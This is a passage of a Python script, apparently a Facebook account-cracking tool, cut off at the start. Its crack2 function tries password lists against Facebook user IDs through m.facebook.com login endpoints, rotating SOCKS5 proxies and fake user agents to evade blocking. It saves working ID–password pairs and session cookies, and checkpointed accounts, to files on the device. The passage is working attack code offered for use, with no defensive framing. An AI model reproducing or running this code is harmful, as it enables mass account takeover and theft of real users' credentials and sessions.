                open('/sdcard/MR🛠️X💚🥀-CP.txt', 'a').write(idf+'|'+pw+'\n')
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                open('/sdcard/MR🛠️X💚🥀-OK.txt', 'a').write(idf+'|'+pw+'|'+kuki+'\n')     
                print(f'\r{P} {K}({H}MR🛠️X💚🥀-Firee{K}){P} {H}{idf} {P}>{H} {pw} {P}>{H} {saurabh(idf)}{P}')                
                if 'y' in cooki:
                  print(f' (\u001b[36m>\033[1;37m) COOKIE > {H}'+ kuki)  
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#--------------------[ METHOD CP ]-----------------#
def crack2(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}(MR🛠️X💚🥀){P} ({P}{loop}{P}-{P}{len(id)}{P}) (OK{P}-{H}{ok}{P}) (CP{P}-{m}{cp}{P}) ({'{:.0%}'.format(loop/float(len(id)))}{P})"),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.9"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}         
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])            
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
               if 'y' in cpxx:
                print(f'\r{P} {K}({M}MR🛠️X💚🥀-Check{K}){P} {M}{idf} {P}>{M} {pw} {P}>{M} {saurabh(idf)}{P}')   
                open('/sdcard/MR🛠️X💚🥀-CP.txt', 'a').write(idf+'|'+pw+'\n')
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                open('/sdcard/MR🛠️X💚🥀-OK.txt', 'a').write(idf+'|'+pw+'|'+kuki+'\n')     
                print(f'\r{P} {K}({H}MR🛠️X💚🥀-Firee{K}){P} {H}{idf} {P}>{H} {pw} {P}>{H} {saurabh(idf)}{P}')                
                if 'y' in cooki:
                  print(f' (\u001b[36m>\033[1;37m) COOKIE > {H}'+ kuki)  
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1    
#-----------------------[ SYSTEM ]--------------------#

if __name__=='__main__':
	try:os.mkdir('/sdcard/MR🛠️X💚🥀')	    
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()